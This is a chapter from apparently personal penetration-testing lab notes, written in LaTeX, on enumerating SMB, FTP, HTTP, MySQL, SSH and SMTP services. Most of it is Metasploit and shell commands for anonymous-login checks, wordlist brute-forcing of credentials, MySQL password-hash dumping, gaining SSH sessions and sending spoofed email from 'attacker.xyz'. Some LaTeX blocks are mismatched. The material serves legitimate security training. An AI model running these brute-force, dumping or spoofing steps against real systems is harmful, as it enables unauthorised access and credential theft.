\chapter{Service Enumeration}
\label{ch:enumeration}

Enumeration is the deep dive into discovered services. Where scanning says
``port 445 is open'', enumeration says ``SMB is running, signing is disabled,
the OS is Windows Server 2016, and these shares are accessible''. That
difference is what turns a scan into an attack plan.

% ─────────────────────────────────────────────────────────────────────────────
\section{Enumeration Workflow --- General Pattern}
\label{sec:enum_workflow}

Every service I enumerate follows the same pattern inside Metasploit:

\begin{termbox}
service postgresql start && msfconsole
workspace -a project_name
setg RHOSTS target_ip
setg RHOST  target_ip
db_nmap -sS -sV target_ip    # Save scan to DB
hosts                         # Confirm target registered
services                      # Review open ports
\end{termbox}

Then for each open service I work through the relevant auxiliary modules.

% ─────────────────────────────────────────────────────────────────────────────
\section{SMB Enumeration}
\label{sec:smb_enum}

\begin{notebox}
SMB theory, authentication, and full exploitation is covered in
Chapter~\ref{ch:smb} on page~\pageref{ch:smb}. This section covers enumeration
commands only.
\end{notebox}



\begin{termbox}
# Manual SMB enumeration
smbclient -L \\\\target_ip\\                    # List shares (guest)
smbclient -L \\\\target_ip\\ -N                 # Null session attempt
smbclient -L demo.ine.local -N                  # Named target
rpcclient -U "" -N demo.ine.local               # Anonymous RPC connection
nmap --script smb-os-discovery.nse -p 445 ip   # OS via SMB

# Metasploit SMB enumeration
use auxiliary/scanner/smb/smb_version
run
use auxiliary/scanner/smb/smb_enumshares
run
use auxiliary/scanner/smb/smb_enumusers
run
\end{termbox}

\begin{notebox}

\screenshot{assets/images/Screenshot_2025-08-04_at_8.02.00_AM.png}{SMB enumeration showing shares and version information}

% ─────────────────────────────────────────────────────────────────────────────
\section{FTP Enumeration}
\label{sec:ftp_enum}

FTP (port 21) is interesting for two reasons: anonymous login and known exploits
against specific server versions (e.g., ProFTPD).

\begin{termbox}
# Check for anonymous login
ftp target_ip
# When prompted for username: anonymous
# When prompted for password: (blank or any email)

# Nmap FTP scripts
nmap -sV -p 21 --script ftp-anon,ftp-bounce target_ip

# Metasploit FTP version scanner
use auxiliary/scanner/ftp/ftp_version
set RHOSTS target_ip
run

# Metasploit anonymous login check
use auxiliary/scanner/ftp/anonymous
set RHOSTS target_ip
run

# Brute-force FTP credentials
use auxiliary/scanner/ftp/ftp_login
set RHOSTS target_ip
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
\end{termbox}

\begin{notebox}[After FTP brute-force]
FTP may not respond for a short time after brute-forcing completes. This is normal
--- the server may have rate limiting or connection throttling. Wait a moment and
retry.
\end{notebox}

\begin{termbox}
# If ProFTPD is running, search for version-specific exploits
search ProFTPD
# Replace version with the actual version found from nmap -sV
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{HTTP / Web Server Enumeration}
\label{sec:http_enum}

\begin{termbox}
# Metasploit HTTP enumeration workflow
use auxiliary/scanner/http/http_version
show options
set RHOSTS target_ip
set SSL false     # or true if HTTPS
run

# Directory scanning
use auxiliary/scanner/http/dir_scanner
set RHOSTS target_ip
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run

# Brute-force HTTP basic auth
use auxiliary/scanner/http/http_login
set RHOSTS target_ip
set AUTH_URI /secure/          # Path found during enumeration
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
\end{termbox}

\begin{notebox}
\ic{robots.txt} is always worth checking manually. It tells search engines
what not to index --- which means it often reveals hidden directories, admin
panels, and upload locations. Check \ic{http://target/robots.txt} before any
automated scan.
\end{notebox}

\screenshot{assets/images/Screenshot_2025-08-04_at_8.05.26_AM.png}{HTTP directory enumeration finding hidden paths}

\screenshot{assets/images/Screenshot_2025-08-04_at_8.06.15_AM.png}{robots.txt revealing interesting directories on the target}

% ─────────────────────────────────────────────────────────────────────────────
\section{MySQL Enumeration}
\label{sec:mysql_enum}

MySQL on port 3306 is a significant finding. Unauthenticated access or weak
root credentials can expose the entire database.

\end{notebox}

\begin{termbox}
# Metasploit MySQL modules (run after finding port 3306 open)
use auxiliary/scanner/mysql/mysql_version
set RHOSTS target_ip
run

# Brute-force MySQL root password
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target_ip
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# Once logged in --- enumerate the database
use auxiliary/admin/mysql/mysql_sql
set PASSWORD found_password
set USERNAME root
run

# Dump schema
use auxiliary/scanner/mysql/mysql_schemadump
set PASSWORD found_password
set USERNAME root
run

# Dump password hashes
use auxiliary/scanner/mysql/mysql_hashdump
set PASSWORD found_password
set USERNAME root
run

# File enumeration
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run

# Manual login after finding credentials
mysql -h target_ip -u root -p
# Then inside mysql:
# show databases;
# use database_name;
# show tables;
# select * from table_name;
\end{termbox}

\begin{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{SSH Enumeration}
\label{sec:ssh_enum}

\begin{termbox}
# Check SSH version
nmap -sV -p 22 target_ip

# Enumerate valid usernames (SSH user enum)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS target_ip
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run

# Brute-force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target_ip
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE false
run

# If credentials found, access session
sessions
sessions -i session_number

# Inside session
ls
whoami
/bin/bash -i     # Upgrade to interactive bash if ls returns nothing
find / -name "flag"
cat /flag
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{SMTP Enumeration}
\label{sec:smtp_enum}

SMTP (port 25) can be used to enumerate valid email addresses using the
\ic{VRFY} command, which many mail servers respond to.

\begin{termbox}
# Find which port SMTP is running on
nmap -sV --script banner target_ip

# Connect manually
nc target_ip 25

# SMTP commands
HELO attacker.xyz
EHLO attacker.xyz
VRFY admin@openmailbox.xyz          # Check if user exists
VRFY commander@openmailbox.xyz

# Send fake email via telnet (demonstration only)
telnet target_ip 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to: root@openmailbox.xyz
data
Subject: Test
Hello from attacker.
.

# Command-line user enumeration
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t target_ip

# Metasploit SMTP enumeration
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS target_ip
run

# Send fake email using sendemail
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz \
  -s target_ip -u "Subject" -m "Message body" -o tls=no
\end{termbox}

\begin{notebox}
The \ic{data} command initiates the email body in telnet. The session ends with
a line containing only a dot (\ic{.}). This terminates the DATA block.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Reviewing Results in Metasploit}
\label{sec:msf_results}

After running multiple enumeration modules, Metasploit's database holds all
findings. These commands retrieve them:

\begin{termbox}
hosts      # All discovered hosts
services   # All discovered services and ports
loot       # Captured data (hashes, files, etc.)
creds      # Credentials found during enumeration
vulns      # Identified vulnerabilities
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Learning Output}

\begin{takebox}
\textbf{What I Learned}
\begin{itemize}
  \item Enumeration is where the attack plan actually forms. Scanning finds ports;
        enumeration tells me how to use them.
  \item The Metasploit database (\ic{hosts}, \ic{services}, \ic{creds}) is
        underused by beginners. Feeding everything through db\_nmap and running
        enumeration modules means I have a searchable record of everything.
  \item MySQL with root and a weak password is more common than it should be.
        Always try \ic{root} with blank password and common passwords first.
\end{itemize}

\textbf{Enumeration Mindset --- What to Check First}
\begin{enumerate}
  \item Check open ports against known services
  \item For each service: version, anonymous access, known CVEs
  \item FTP: anonymous login attempt first
  \item HTTP: \ic{robots.txt}, directory scan, basic auth locations
  \item SMB: null session, share listing, OS discovery
  \item MySQL: root with no password or common password
  \item SSH: user enumeration, then targeted brute-force
  \item SMTP: \ic{VRFY} command to confirm valid users
\end{enumerate}

\textbf{Common Mistakes}
\begin{itemize}
  \item Skipping anonymous login checks --- it still works surprisingly often
  \item Running brute-force on every service immediately ---
        start with version detection and known exploits first
  \item Not using \ic{VERBOSE false} during brute-force --- the output
        of failed attempts makes it hard to spot the success line
  \item Not saving credentials found during enumeration before moving on
\end{itemize}

\textbf{Real-World Impact}
\begin{itemize}
  \item Anonymous FTP access: free file download/upload on a server
  \item SMTP user enumeration: valid email list for phishing
  \item MySQL root access: full database dump, credential extraction
  \item SSH credentials: direct persistent access to the system
\end{itemize}
\end{takebox}

\end{notebox}